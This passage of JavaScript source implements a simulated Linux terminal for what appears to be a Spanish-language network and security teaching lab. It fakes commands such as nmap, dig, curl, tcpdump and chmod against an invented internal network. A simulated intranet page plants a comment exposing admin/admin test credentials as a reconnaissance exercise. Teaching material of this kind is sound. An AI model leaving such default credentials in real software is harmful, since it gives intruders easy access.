    const { f, rest } = flagsOf(args); const r = inputText(rest, ctx, 'sort'); if (r.err) return { out: r.err, err: true };
    let l = lines(r.text);
    l.sort(f.has('n') ? (a, b) => (parseFloat(a) || 0) - (parseFloat(b) || 0) : (a, b) => a.localeCompare(b));
    if (f.has('r')) l.reverse(); if (f.has('u')) l = [...new Set(l)];
    return l.join('\n');
  },
  uniq(args, ctx) {
    const { f, rest } = flagsOf(args); const r = inputText(rest, ctx, 'uniq'); if (r.err) return { out: r.err, err: true };
    const out = []; let prev = null, n = 0;
    const push = () => { if (prev !== null) out.push(f.has('c') ? lpad(n, 7) + ' ' + prev : prev); };
    for (const ln of lines(r.text)) { if (ln === prev) n++; else { push(); prev = ln; n = 1; } }
    push(); return out.join('\n');
  },
  awk(args, ctx) {
    let sep = null; const a = args.slice();
    if (a[0] && a[0].startsWith('-F')) { sep = a[0].length > 2 ? a[0].slice(2) : a[1]; a.splice(0, a[0].length > 2 ? 1 : 2); }
    const prog = a[0] || ''; const m = prog.match(/^\{\s*print\s*(.*?)\s*\}$/);
    if (!m) return { out: t('awk: en el laboratorio solo funciona la forma awk \'{print $N}\' (por ejemplo awk \'{print $11}\')'), err: true };
    const r = inputText(a.slice(1), ctx, 'awk'); if (r.err) return { out: r.err, err: true };
    const parts = m[1] ? m[1].split(/\s*,\s*/) : ['$0'];
    return lines(r.text).map(ln => { const fl = sep ? ln.split(sep) : ln.trim().split(/\s+/); return parts.map(p => { const k = p.match(/^\$(\d+)$/); if (!k) return p.replace(/^"|"$/g, ''); return +k[1] === 0 ? ln : (fl[+k[1] - 1] || ''); }).join(' '); }).join('\n');
  },
  cut(args, ctx) {
    let d = '\t', fields = null; const rest = [];
    for (let i = 0; i < args.length; i++) {
      const x = args[i];
      if (x === '-d') d = args[++i]; else if (x.startsWith('-d')) d = x.slice(2);
      else if (x === '-f') fields = args[++i]; else if (x.startsWith('-f')) fields = x.slice(2); else rest.push(x);
    }
    if (!fields) return { out: t('uso: cut -d: -f1 archivo'), err: true };
    const idx = fields.split(',').map(Number);
    const r = inputText(rest, ctx, 'cut'); if (r.err) return { out: r.err, err: true };
    return lines(r.text).map(ln => { const p = ln.split(d); return idx.map(i => p[i - 1] || '').join(d); }).join('\n');
  },
  touch(args, ctx) { for (const a of args) { const s = ctx.sim, p = s.abs(a); if (!s.node(p)) { const e = s.writeFile(a, '', false, ctx.user); if (e) return { out: e.replace('bash', 'touch'), err: true }; } } return ''; },
  mkdir(args, ctx) {
    const s = ctx.sim;
    for (const a of args.filter(x => !x.startsWith('-'))) {
      const p = s.abs(a), { dir, name } = s.parent(p);
      if (!dir) return { out: `mkdir: cannot create directory '${a}': No such file or directory`, err: true };
      if (dir.c[name]) return { out: `mkdir: cannot create directory '${a}': File exists`, err: true };
      if (!s.can(dir, 2, ctx.user)) return { out: `mkdir: cannot create directory '${a}': Permission denied`, err: true };
      dir.c[name] = D(ctx.user, '755', {}, ctx.user);
    }
    return '';
  },
  rm(args, ctx) {
    const s = ctx.sim; const { f, rest } = flagsOf(args);
    for (const a of rest) {
      const p = s.abs(a); if (p === '/' || p === '/home' || p === s.home) return { out: t("rm: no se permite borrar '{file}' en el laboratorio", { file: a }), err: true };
      const { dir, name } = s.parent(p); const n = dir && dir.c[name];
      if (!n) return { out: `rm: cannot remove '${a}': No such file or directory`, err: true };
      if (n.t === 'd' && !f.has('r')) return { out: `rm: cannot remove '${a}': Is a directory`, err: true };
      if (!s.can(dir, 2, ctx.user)) return { out: `rm: cannot remove '${a}': Permission denied`, err: true };
      delete dir.c[name];
    }
    return '';
  },
  chmod(args, ctx) {
    const s = ctx.sim; if (args.length < 2) return { out: t('uso: chmod 600 archivo   (o chmod u+x archivo)'), err: true };
    const mode = args[0];
    for (const a of args.slice(1)) {
      const p = s.abs(a), r = s.reach(p, ctx.user);
      if (r.err) return { out: `chmod: cannot access '${a}': ${r.err}`, err: true };
      if (ctx.user !== 'root' && r.n.owner !== ctx.user) return { out: `chmod: changing permissions of '${a}': Operation not permitted`, err: true };
      if (/^[0-7]{3}$/.test(mode)) r.n.perm = mode;
      else {
        const m = mode.match(/^([ugoa]*)([+\-=])([rwx]+)$/);
        if (!m) return { out: `chmod: invalid mode: '${mode}'. ` + t('Usa números (chmod 600) o letras (chmod u+x).'), err: true };
        const who = (m[1] || 'a').replace('a', 'ugo'), bits = (m[3].includes('r') ? 4 : 0) | (m[3].includes('w') ? 2 : 0) | (m[3].includes('x') ? 1 : 0);
        const p3 = r.n.perm.split('').map(Number);
        ['u', 'g', 'o'].forEach((w, i) => { if (!who.includes(w)) return; if (m[2] === '+') p3[i] |= bits; else if (m[2] === '-') p3[i] &= ~bits; else p3[i] = bits; });
        r.n.perm = p3.join('');
      }
    }
    return '';
  },
  ip(args) {
    const sub = args[0] || '';
    if (/^a(ddr)?$/.test(sub)) return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    link/ether ${ME.mac} brd ff:ff:ff:ff:ff:ff
    inet ${ME.ip}/${ME.cidr} brd 10.10.10.255 scope global eth0
    inet6 fe80::42:aff:fe0a:a64/64 scope link`;
    if (/^r(oute)?$/.test(sub)) return `default via ${ME.gw} dev eth0 proto dhcp metric 100\n10.10.10.0/24 dev eth0 proto kernel scope link src ${ME.ip}`;
    return { out: t('uso: ip a  (direcciones)   ·   ip route  (rutas)'), err: true };
  },
  ifconfig() {
    return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet ${ME.ip}  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::42:aff:fe0a:a64  prefixlen 64  scopeid 0x20<link>
        ether ${ME.mac}  txqueuelen 1000  (Ethernet)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>`;
  },
  route() { return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         ${ME.gw}      0.0.0.0         UG    100    0        0 eth0
10.10.10.0      0.0.0.0         255.255.255.0   U     100    0        0 eth0`; },
  ping(args, ctx) {
    let count = 4; const rest = [];
    for (let i = 0; i < args.length; i++) { if (args[i] === '-c') count = parseInt(args[++i], 10) || 4; else if (/^-c\d+$/.test(args[i])) count = +args[i].slice(2); else if (!args[i].startsWith('-')) rest.push(args[i]); }
    count = Math.min(Math.max(count, 1), 10);
    if (!rest[0]) return { out: I18N.t('uso: ping -c 4 destino'), err: true };
    const r = ctx.sim.resolve(rest[0]); if (!r) return { out: `ping: ${rest[0]}: Name or service not known`, err: true };
    const ip = r.ips[0], h = ctx.sim.hostInfo(ip), label = isIP(rest[0]) ? ip : `${r.canon} (${ip})`;
    const o = [`PING ${label} 56(84) bytes of data.`];
    if (!h.up) {
      for (let i = 1; i <= count; i++) o.push(`From ${ME.ip} icmp_seq=${i} Destination Host Unreachable`);
      o.push('', `--- ${isIP(rest[0]) ? ip : r.canon} ping statistics ---`, `${count} packets transmitted, 0 received, +${count} errors, 100% packet loss`);
      return o.join('\n');
    }
    const base = ip === ME.ip || ip === '127.0.0.1' ? 0.03 : h.internal ? 0.4 : 14.8; const times = [];
    for (let i = 1; i <= count; i++) { const t = +(base * (0.85 + ((i * 37) % 30) / 100)).toFixed(base < 1 ? 3 : 1); times.push(t); o.push(`64 bytes from ${h.internal && !isIP(rest[0]) ? `${h.name} (${ip})` : ip}: icmp_seq=${i} ttl=${h.ttl} time=${t} ms`); }
    const mn = Math.min(...times), mx = Math.max(...times), av = times.reduce((a, b) => a + b, 0) / times.length;
    o.push('', `--- ${isIP(rest[0]) ? ip : r.canon} ping statistics ---`, `${count} packets transmitted, ${count} received, 0% packet loss, time ${count * 1000 - 997}ms`, `rtt min/avg/max/mdev = ${mn.toFixed(3)}/${av.toFixed(3)}/${mx.toFixed(3)}/${((mx - mn) / 2).toFixed(3)} ms`);
    if (!args.some(a => a.startsWith('-c'))) o.push(I18N.t('(En Linux ping no para solo: el laboratorio envía 4 paquetes. En tu Mac usa ping -c 4 o pulsa Ctrl+C.)'));
    return o.join('\n');
  },
  traceroute(args, ctx) {
    const t = args.find(a => !a.startsWith('-')); if (!t) return { out: I18N.t('uso: traceroute destino'), err: true };
    const r = ctx.sim.resolve(t); if (!r) return { out: `traceroute: ${t}: Name or service not known`, err: true };
    const ip = r.ips[0], h = ctx.sim.hostInfo(ip);
    const o = [`traceroute to ${isIP(t) ? ip : r.canon} (${ip}), 30 hops max, 60 byte packets`];
    if (h.internal) { o.push(h.up ? ` 1  ${h.name || ip} (${ip})  0.412 ms  0.388 ms  0.371 ms` : ` 1  * * *\n 2  * * *\n 3  ${ME.ip} (${ME.ip})  3001.2 ms !H`); return o.join('\n'); }
    if (!h.up) { o.push(` 1  gateway.labcorp.local (${ME.gw})  0.521 ms  0.498 ms  0.477 ms`, ' 2  * * *', ' 3  * * *', ' 4  * * *'); return o.join('\n'); }
    o.push(` 1  gateway.labcorp.local (${ME.gw})  0.521 ms  0.498 ms  0.477 ms`,
      ' 2  100.64.0.1 (100.64.0.1)  4.112 ms  4.087 ms  4.902 ms',
      ' 3  core1.mia.isp-ejemplo.net (192.0.2.17)  8.301 ms  8.277 ms  9.004 ms',
      ' 4  * * *', ' 5  * * *',
      ' 6  ae-2.border.mia.isp-ejemplo.net (192.0.2.33)  11.874 ms  11.902 ms  12.011 ms',
      ' 7  * * *',
      ` 8  ${h.name} (${ip})  14.809 ms  14.733 ms  15.002 ms`);
    return o.join('\n');
  },
  nslookup(args, ctx) {
    let type = 'A'; const rest = [];
    for (const a of args) { const m = a.match(/^-(?:type|query|q)=(\w+)$/i); if (m) type = m[1].toUpperCase(); else rest.push(a); }
    const name = rest[0]; if (!name) return { out: t('uso: nslookup nombre   ·   nslookup -type=mx dominio'), err: true };
    const head = `Server:\t\t${ME.gw}\nAddress:\t${ME.gw}#53\n`;
    if (isIP(name)) {
      const h = HOSTS[name] || EXTERNAL[name];
      if (!h) return { out: head + `\n** server can't find ${name.split('.').reverse().join('.')}.in-addr.arpa: NXDOMAIN`, err: true };
      return head + `\n${name.split('.').reverse().join('.')}.in-addr.arpa\tname = ${h.name}.`;
    }
    const q = name.replace(/\.$/, '').toLowerCase();
    const zone = DNS[q] || (!q.includes('.') && DNS[q + '.labcorp.local'] ? DNS[q + '.labcorp.local'] : null);
    const qn = DNS[q] ? q : q + '.labcorp.local';
    const internal = qn.endsWith('labcorp.local');
    if (!zone) return { out: head + `\n** server can't find ${name}: NXDOMAIN`, err: true };
    let o = head + '\n' + (internal ? '' : 'Non-authoritative answer:\n');
    if (type === 'A') {
      const r = ctx.sim.resolve(qn);
      (r.chain || []).forEach(([a, b]) => { o += `${a}\tcanonical name = ${b}.\n`; });
      r.ips.forEach(ip => { o += `Name:\t${r.canon}\nAddress: ${ip}\n`; });
    } else if (type === 'MX') {
      if (!zone.MX) return o + `*** No mail exchanger (MX) records available for ${qn}`;
      zone.MX.forEach(v => { o += `${qn}\tmail exchanger = ${v}.\n`; });
    } else if (zone[type]) zone[type].forEach(v => { o += `${qn}\t${type === 'NS' ? 'nameserver' : type === 'TXT' ? 'text' : type} = ${v}${type === 'TXT' ? '' : '.'}\n`; });
    else o += `*** No ${type} records available for ${qn}`;
    return o.replace(/\n$/, '');
  },
  dig(args, ctx) {
    let type = 'A', short = false, name = null, rev = false;
    for (let i = 0; i < args.length; i++) {
      const a = args[i];
      if (a === '+short') short = true; else if (a.startsWith('@')) continue; else if (a.startsWith('+')) continue;
      else if (a === '-x') { rev = true; name = args[++i]; } else if (a === '-t') type = (args[++i] || 'A').toUpperCase();
      else if (/^(A|AAAA|MX|NS|TXT|CNAME|ANY|SOA|PTR)$/i.test(a) && name) type = a.toUpperCase();
      else if (/^(MX|NS|TXT|CNAME|AAAA|SOA)$/i.test(a) && !name) type = a.toUpperCase();
      else if (!name) name = a;
    }
    if (!name) return { out: I18N.t('uso: dig nombre [tipo] [+short]   ·   dig -x IP'), err: true };
    const ans = []; let status = 'NOERROR'; let qname = name.replace(/\.$/, '').toLowerCase();
    if (rev) {
      const h = HOSTS[name] || EXTERNAL[name]; type = 'PTR'; qname = name.split('.').reverse().join('.') + '.in-addr.arpa';
      if (h) ans.push([qname, 'PTR', h.name + '.']); else status = 'NXDOMAIN';
    } else {
      if (!DNS[qname] && !qname.includes('.') && DNS[qname + '.labcorp.local']) qname += '.labcorp.local';
      const z = DNS[qname];
      if (!z) status = 'NXDOMAIN';
      else if (type === 'A' || type === 'CNAME') {
        let q = qname;
        for (let i = 0; i < 5 && DNS[q] && DNS[q].CNAME; i++) { ans.push([q, 'CNAME', DNS[q].CNAME[0] + '.']); q = DNS[q].CNAME[0]; if (type === 'CNAME') break; }
        if (type === 'A' && DNS[q] && DNS[q].A) DNS[q].A.forEach(ip => ans.push([q, 'A', ip]));
      } else if (type === 'ANY') { Object.entries(z).forEach(([t, vs]) => vs.forEach(v => ans.push([qname, t, /^(MX|NS|CNAME)$/.test(t) ? v + '.' : v]))); }
      else if (z[type]) z[type].forEach(v => ans.push([qname, type, /^(MX|NS)$/.test(type) ? v + '.' : v]));
    }
    if (short) return ans.map(a => a[2]).join('\n');
    const o = [`; <<>> DiG 9.18.28 <<>> ${args.join(' ')}`, ';; global options: +cmd', ';; Got answer:',
      `;; ->>HEADER<<- opcode: QUERY, status: ${status}, id: ${4000 + (qname.length * 97) % 5000}`,
      `;; flags: qr ${qname.endsWith('labcorp.local') ? 'aa ' : ''}rd ra; QUERY: 1, ANSWER: ${ans.length}, AUTHORITY: 0, ADDITIONAL: 1`, '',
      ';; QUESTION SECTION:', `;${qname}.\t\t\tIN\t${type}`];
    if (ans.length) { o.push('', ';; ANSWER SECTION:'); ans.forEach(([n, t, v]) => o.push(`${n}.\t\t300\tIN\t${t}\t${v}`)); }
    o.push('', `;; Query time: ${qname.endsWith('labcorp.local') ? 1 : 18} msec`, `;; SERVER: ${ME.gw}#53(${ME.gw}) (UDP)`, `;; WHEN: ${new Date().toString().replace(/ GMT.*$/, '')}`, `;; MSG SIZE  rcvd: ${40 + ans.length * 16}`);
    return o.join('\n');
  },
  host(args, ctx) {
    const name = args.find(a => !a.startsWith('-')); if (!name) return { out: t('uso: host nombre'), err: true };
    if (isIP(name)) { const h = HOSTS[name] || EXTERNAL[name]; return h ? `${name.split('.').reverse().join('.')}.in-addr.arpa domain name pointer ${h.name}.` : { out: `Host ${name}.in-addr.arpa. not found: 3(NXDOMAIN)`, err: true }; }
    const r = ctx.sim.resolve(name); let q = name.toLowerCase(); if (!DNS[q] && DNS[q + '.labcorp.local']) q += '.labcorp.local';
    if (!r && !DNS[q]) return { out: `Host ${name} not found: 3(NXDOMAIN)`, err: true };
    const o = [];
    (r && r.chain || []).forEach(([a, b]) => o.push(`${a} is an alias for ${b}.`));
    (r ? r.ips : []).forEach(ip => o.push(`${r.canon} has address ${ip}`));
    (DNS[q] && DNS[q].MX || []).forEach(v => o.push(`${q} mail is handled by ${v}.`));
    return o.join('\n');
  },
  curl(args, ctx) {
    const { f, rest } = flagsOf(args); let url = rest[0];
    if (!url) return { out: t('uso: curl ifconfig.me   ·   curl -I http://www.labcorp.local'), err: true };
    const m = url.match(/^(?:(https?):\/\/)?([^\/:]+)(?::(\d+))?(\/.*)?$/); if (!m) return { out: `curl: (3) URL rejected: Bad hostname`, err: true };
    const scheme = m[1] || 'http', hostn = m[2], port = +(m[3] || (scheme === 'https' ? 443 : 80));
    if (hostn === 'ifconfig.me') return f.has('I') ? 'HTTP/1.1 200 OK\ncontent-type: text/plain\ncontent-length: 12' : ME.pub;
    const r = ctx.sim.resolve(hostn); if (!r) return { out: `curl: (6) Could not resolve host: ${hostn}`, err: true };
    const ip = r.ips[0], h = ctx.sim.hostInfo(ip);
    if (!h.up) return { out: `curl: (28) Failed to connect to ${hostn} port ${port} after 3001 ms: Couldn't connect to server`, err: true };
    const st = (h.ports[port] || [h.def])[0];
    if (st !== 'open') return { out: st === 'filtered' ? `curl: (28) Failed to connect to ${hostn} port ${port} after 3001 ms: Timeout was reached` : `curl: (7) Failed to connect to ${hostn} port ${port} after 1 ms: Connection refused`, err: true };
    const server = (h.ports[port][2] || 'server').replace(' ', '/');
    const headers = `HTTP/1.1 200 OK\nServer: ${server}\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: 612\nConnection: keep-alive`;
    if (f.has('I')) return headers;
    const body = ip === '10.10.10.10' ? `<!doctype html>\n<html><head><title>LabCorp · Intranet</title></head>\n<body><h1>${t('Bienvenido a LabCorp')}</h1>\n<!-- ${t('TODO: quitar el acceso de prueba admin/admin antes de producción')} -->\n</body></html>` :
      ip === '10.10.10.50' ? `<html><body><h1>HP LaserJet · ${t('Estado: Listo')}</h1></body></html>` :
      ip === '10.10.10.1' ? `<html><body><h1>Router LabCorp</h1><p>${t('Inicia sesión para administrar.')}</p></body></html>` :
      GH.includes(ip) ? '<!doctype html>\n<html lang="es"><head><title>Huerga Labs</title></head>\n<body>…</body></html>' : `<html><body><h1>${t('Página de ejemplo')}</h1></body></html>`;
    return f.has('i') ? headers + '\n\n' + body : body;
  },
  ss(args) {
    const { f } = flagsOf(args);
    if (!f.has('l')) return 'Netid State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port\ntcp   ESTAB  0      0       10.10.10.100:50412     10.10.10.20:22\n' + t('(Usa ss -tuln para ver los puertos en escucha.)');
    const rows = [['udp', 'UNCONN', '0', '0', '127.0.0.53%lo:53', '0.0.0.0:*'], ['tcp', 'LISTEN', '0', '128', '0.0.0.0:22', '0.0.0.0:*'], ['tcp', 'LISTEN', '0', '151', '0.0.0.0:3306', '0.0.0.0:*'], ['tcp', 'LISTEN', '0', '511', '127.0.0.1:8000', '0.0.0.0:*'], ['tcp', 'LISTEN', '0', '4096', '127.0.0.1:631', '0.0.0.0:*']];
    return 'Netid State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port\n' + rows.map(r => `${pad(r[0], 6)}${pad(r[1], 7)}${pad(r[2], 7)}${pad(r[3], 8)}${pad(r[4], 22)}${r[5]}`).join('\n');
  },
  netstat(args) { return 'Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN\nudp        0      0 127.0.0.53:53           0.0.0.0:*'; },
  ps(args, ctx) {
    const head = 'USER         PID %CPU %MEM COMMAND';
    const all = ctx.sim.procs.concat([{ user: 'alumno', pid: 5001 + ctx.sim.history.length, cpu: 0, mem: 0.1, cmd: 'ps ' + args.join(' ') }]);
    const list = args.join('').includes('a') ? all : all.filter(p => p.user === 'alumno');
    return head + '\n' + list.map(p => `${pad(p.user, 9)}${lpad(p.pid, 6)} ${lpad(p.cpu.toFixed(1), 4)} ${lpad(p.mem.toFixed(1), 4)} ${p.cmd}`).join('\n');
  },
  kill(args, ctx) {
    const pid = parseInt(args.filter(a => !a.startsWith('-'))[0], 10); if (!pid) return { out: t('uso: kill PID   (mira el PID con ps aux)'), err: true };
    const s = ctx.sim, i = s.procs.findIndex(p => p.pid === pid);
    if (i < 0) return { out: `bash: kill: (${pid}) - No such process`, err: true };
    if (ctx.user !== 'root' && s.procs[i].user !== ctx.user) return { out: `bash: kill: (${pid}) - Operation not permitted`, err: true };
    if (pid === 1) return { out: 'bash: kill: (1) - ' + t('en el laboratorio no puedes matar init'), err: true };
    s.procs.splice(i, 1); return '';
  },
  ipcalc(args) {
    const a = args.find(x => !x.startsWith('-')); const m = a && a.match(/^([\d.]+)(?:\/(\d{1,2}))?$/);
    if (!m || !isIP(m[1])) return { out: t('uso: ipcalc 10.10.10.77/26'), err: true };
    const c = m[2] === undefined ? 24 : +m[2]; if (c > 32) return { out: 'ipcalc: ' + t('prefijo no válido'), err: true };
    const ip = ipInt(m[1]), mk = maskOf(c), net = (ip & mk) >>> 0, bc = (net | (~mk >>> 0)) >>> 0;
    const bin = n => { const b = n.toString(2).padStart(32, '0'); const s = b.slice(0, 8) + '.' + b.slice(8, 16) + '.' + b.slice(16, 24) + '.' + b.slice(24); const pos = c + Math.floor(c / 8) - (c % 8 === 0 && c > 0 ? 1 : 0); return c === 0 || c === 32 ? s : s.slice(0, pos + (c % 8 === 0 ? 1 : 0)) + ' ' + s.slice(pos + (c % 8 === 0 ? 1 : 0)); };
    const hosts = c >= 31 ? (c === 32 ? 1 : 2) : 2 ** (32 - c) - 2;
    const first = c >= 31 ? net : net + 1, last = c >= 31 ? bc : bc - 1;
    const priv = (net >>> 24) === 10 || (net >>> 20) === 0xAC1 || (net >>> 16) === 0xC0A8;
    const L = (k, v, b) => `${pad(k, 11)}${pad(v, 21)}${b || ''}`;
    return [L('Address:', m[1], bin(ip)), L('Netmask:', intIp(mk) + ' = ' + c, bin(mk)), L('Wildcard:', intIp(~mk >>> 0), bin(~mk >>> 0)), '=>',
      L('Network:', intIp(net) + '/' + c, bin(net)), L('HostMin:', intIp(first), bin(first)), L('HostMax:', intIp(last), bin(last)),
      L('Broadcast:', c >= 31 ? t('(ninguno)') : intIp(bc), c >= 31 ? '' : bin(bc)), L('Hosts/Net:', String(hosts), priv ? 'Private Internet' : '')].join('\n');
  },
  tcpdump(args, ctx) {
    const i = args.indexOf('-r');
    if (i < 0) return ctx.user === 'root' ? 'tcpdump: listening on eth0, link-type EN10MB (Ethernet)\n' + t('(En el laboratorio no hay tráfico en vivo. Lee la captura guardada: tcpdump -r captura.pcap)') : { out: 'tcpdump: eth0: You don\'t have permission to capture on that device (socket: Operation not permitted)\n' + t('(Para capturar en vivo hace falta sudo. Para leer una captura no: tcpdump -r captura.pcap)'), err: true };
    const r = ctx.sim.readFile(args[i + 1] || '', ctx.user, 'tcpdump'); if (r.err) return { out: r.err, err: true };
    if (!(args[i + 1] || '').endsWith('.pcap')) return { out: `tcpdump: ${args[i + 1]}: unknown file format`, err: true };
    return `reading from file ${args[i + 1]}, link-type EN10MB (Ethernet), snapshot length 262144
09:20:11.100231 IP 10.10.10.100.51544 > 10.10.10.10.80: Flags [S], seq 1000, win 64240, length 0
09:20:11.100512 IP 10.10.10.10.80 > 10.10.10.100.51544: Flags [S.], seq 7000, ack 1001, win 65160, length 0
09:20:11.100530 IP 10.10.10.100.51544 > 10.10.10.10.80: Flags [.], ack 7001, win 502, length 0
09:20:11.100701 IP 10.10.10.100.51544 > 10.10.10.10.80: Flags [P.], seq 1001:1079, ack 7001, win 502, length 78: HTTP: GET / HTTP/1.1
09:20:11.101410 IP 10.10.10.10.80 > 10.10.10.100.51544: Flags [P.], seq 7001:7613, ack 1079, win 509, length 612: HTTP: HTTP/1.1 200 OK
09:20:11.101433 IP 10.10.10.100.51544 > 10.10.10.10.80: Flags [.], ack 7613, win 501, length 0
09:20:14.220004 IP 10.10.10.100.51560 > 10.10.10.20.8080: Flags [S], seq 2000, win 64240, length 0
09:20:14.220311 IP 10.10.10.20.8080 > 10.10.10.100.51560: Flags [R.], seq 0, ack 2001, win 0, length 0`;
  },
  nmap(args, ctx) {
    const s = ctx.sim; let ports = null; const fl = new Set(); const targets = [];
    for (let i = 0; i < args.length; i++) {
      const a = args[i];
      if (a === '-p') { ports = args[++i]; continue; }
      if (/^-p[\d,\-]/.test(a)) { ports = a.slice(2); continue; }
      if (a === '-p-') { ports = '-'; continue; }
      if (a.startsWith('-')) { fl.add(a.replace(/^-/, '')); continue; }
      targets.push(a);
    }
    if (!targets.length) return { out: I18N.t('uso: nmap [opciones] destino\nEjemplos: nmap 10.10.10.20 · nmap -sn 10.10.10.0/24 · sudo nmap -sS -sV 10.10.10.20'), err: true };
    const syn = fl.has('sS'), ver = fl.has('sV') || fl.has('A'), osd = fl.has('O') || fl.has('A'), sweep = fl.has('sn');
    if ((syn || osd) && ctx.user !== 'root') return { out: 'You requested a scan type which requires root privileges.\nQUITTING!\n' + I18N.t('(Prueba con sudo delante del comando.)'), err: true };
    const now = new Date(); const z = n => String(n).padStart(2, '0');
    const o = [`Starting Nmap 7.94SVN ( https://nmap.org ) at ${now.getFullYear()}-${z(now.getMonth() + 1)}-${z(now.getDate())} ${z(now.getHours())}:${z(now.getMinutes())} EST`];
    let ips = [];
    for (const t of targets) {
      const cm = t.match(/^([\d.]+)\/(\d{1,2})$/);
      if (cm && isIP(cm[1])) { const c = +cm[2]; if (c < 24) return { out: I18N.t('En el laboratorio solo se pueden escanear redes /24 o más pequeñas.'), err: true }; const mk = maskOf(c), n = (ipInt(cm[1]) & mk) >>> 0; for (let k = 0; k < 2 ** (32 - c); k++) ips.push([intIp(n + k), null]); }
      else { const r = s.resolve(t); if (!r) { o.push(`Failed to resolve "${t}".`); continue; } ips.push([r.ips[0], isIP(t) ? null : r.canon]); }
    }
    const external = ips.some(([ip]) => !s.hostInfo(ip).internal);
    if (external) o.splice(1, 0, I18N.t('AVISO: escanear equipos que no son tuyos sin permiso puede ser ilegal. Aquí solo se simula la respuesta.'));
    let up = 0; const t0 = sweep ? 2.31 : 0.42;
    for (const [ip, nm] of ips) {
      const h = s.hostInfo(ip); if (!h.up) continue; up++;
      const label = nm ? `${nm} (${ip})` : (h.name && ips.length > 1 ? `${h.name} (${ip})` : ip);
      o.push(`Nmap scan report for ${label}`, `Host is up (${h.internal ? '0.00' + (12 + up) : '0.015'}s latency).`);
      if (h.name && !ips.length > 1 && !nm) { /* nada */ }
      if (sweep) { if (h.internal && ip !== ME.ip) o.push(`MAC Address: 02:42:0A:0A:0A:${(+ip.split('.')[3]).toString(16).toUpperCase().padStart(2, '0')} (Unknown)`); continue; }
      let list;
      if (ports === '-') list = [...new Set(TOP.concat(Object.keys(h.ports).map(Number)))].sort((a, b) => a - b);
      else if (ports) { list = []; for (const part of ports.split(',')) { const rg = part.split('-').map(Number); if (rg.length === 2) for (let p = rg[0]; p <= rg[1] && list.length < 2000; p++) list.push(p); else if (rg[0]) list.push(rg[0]); } }
      else list = TOP.slice();
      const states = list.map(p => [p, (h.ports[p] || [h.def])[0], h.ports[p] ? h.ports[p][1] : (SVC[p] || 'unknown'), h.ports[p] ? h.ports[p][2] : '']);
      const hidden = states.filter(x => x[1] === h.def);
      const shown = list.length <= 12 ? states : states.filter(x => x[1] !== h.def);
      const total = ports === '-' ? 65535 : ports ? list.length : 1000;
      const nHidden = (ports ? hidden.length : hidden.length + (total - list.length)) - (shown === states ? hidden.length : 0);
      if (nHidden > 0) o.push(`Not shown: ${nHidden} ${h.def} tcp ports (${h.def === 'closed' ? (syn ? 'reset' : 'conn-refused') : 'no-response'})`);
      if (shown.length) { o.push(ver ? 'PORT      STATE    SERVICE        VERSION' : 'PORT      STATE    SERVICE'); shown.forEach(([p, st, sv, v]) => o.push(`${pad(p + '/tcp', 10)}${pad(st, 9)}${ver ? pad(sv, 15) + (st === 'open' ? v : '') : sv}`)); }
      else o.push(`All ${total} scanned ports on ${label} are in ignored states.`);
      if (h.internal && ip !== ME.ip) o.push(`MAC Address: 02:42:0A:0A:0A:${(+ip.split('.')[3]).toString(16).toUpperCase().padStart(2, '0')} (Unknown)`);
      if (osd) o.push(`OS details: ${h.os.replace('(impresora)', I18N.t('(impresora)'))}`);
      o.push('');
    }
    if (!up && ips.length === 1) o.push('Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn');
    o.push(`Nmap done: ${ips.length} IP address${ips.length > 1 ? 'es' : ''} (${up} host${up === 1 ? '' : 's'} up) scanned in ${(t0 + up * (sweep ? 0.01 : 1.1)).toFixed(2)} seconds`);
    return o.join('\n').replace(/\n\n(Nmap done)/, '\n$1');
  },
  python3(args, ctx) {
    const f = args[0]; if (!f) return { out: t('El intérprete interactivo no está disponible en el laboratorio.\nEjecuta un script: python3 scripts/contar_ips.py'), err: true };
    const r = ctx.sim.readFile(f, ctx.user, 'python3');
    if (r.err) return { out: `python3: can't open file '${ctx.sim.abs(f)}': [Errno 2] No such file or directory`, err: true };
    if (/print\("Hola desde Python"\)/.test(r.text) && r.text.trim().split('\n').length === 1) return 'Hola desde Python';
    if (r.text.includes('Counter') && r.text.includes('auth.log')) {
      const lg = ctx.sim.readFile('/var/log/auth.log', ctx.user, 'python3');
      if (lg.err) return { out: 'PermissionError: [Errno 13] Permission denied: \'/var/log/auth.log\'', err: true };
      const c = {}; lines(lg.text).forEach(l => { const m = l.match(/Failed password for (?:invalid user )?\S+ from (\S+)/); if (m) c[m[1]] = (c[m[1]] || 0) + 1; });
      return Object.entries(c).sort((a, b) => b[1] - a[1]).map(([ip, n]) => `${pad(ip, 16)} ${t('{n} intentos', { n })}`).join('\n');
    }
    const prints = [...r.text.matchAll(/^print\((["'])(.*?)\1\)\s*$/gm)].map(m => m[2]);
    if (prints.length) return prints.join('\n');
    return t('(El laboratorio solo puede ejecutar los scripts de ejemplo y scripts sencillos con print.)');
  },
  ssh(args) { return { out: 'ssh: ' + t('en el laboratorio no puedes conectarte a otros equipos todavía. Llegará en la Fase 2.'), err: true }; },
};
CMDS.ll = (args, ctx) => CMDS.ls(['-la'].concat(args), ctx);

/* ------------------------------------------------------------------ */
/* Interfaz                                                            */
/* ------------------------------------------------------------------ */
function mount(el, opts) {
  opts = opts || {};
  const sim = new Sim(); const listeners = [];
